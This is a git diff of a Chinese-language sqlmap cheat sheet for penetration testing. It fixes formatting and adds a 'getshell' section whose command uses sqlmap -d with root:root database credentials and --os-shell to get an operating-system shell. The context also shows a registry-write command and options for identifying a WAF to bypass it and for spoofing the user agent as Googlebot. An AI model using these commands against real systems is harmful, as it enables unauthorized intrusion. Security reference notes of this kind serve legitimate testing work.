@@ -1,7 +1,7 @@
 # Sqlmap
 
 <p align="center">
-    <img src="../../../assets/img/logo/Sqlmap.png" width="25%"></a>
+    <img src="../../../assets/img/logo/Sqlmap.png" width="25%">
 </p>
 
 ---
@@ -15,7 +15,7 @@
 **官网**
 - https://github.com/sqlmapproject/sqlmap
 
-**文章**
+**文章 & Reference**
 - [Sqlmap使用教程[个人笔记精华整理] | 漏洞人生](http://www.vuln.cn/1992)
 - [sqlmap用户手册[续]](http://drops.xmd5.com/static/drops/tips-401.html)
 
@@ -100,10 +100,15 @@ sqlmap -u URL --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-val
 --eta                                           # 计算注入数据的剩余时间
 ```
 
-**测试WAF/IPS/IDS保护**
+**测试 WAF/IPS/IDS 保护**
 ```bash
 --identify-waf                                                      # 尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。
 --mobile                                                            # 模仿智能手机
 --referer "http://www.google.com"                                   # 模拟来源
 --user-agent "Googlebot/2.1(+http://www.googlebot.com/bot.html)"    # 模拟谷歌蜘蛛
+```
+
+**尝试 getshell**
+```bash
+sqlmap -d "mysql://root:root@192.168.1.1:3306/mysql" --os-shell
 ```
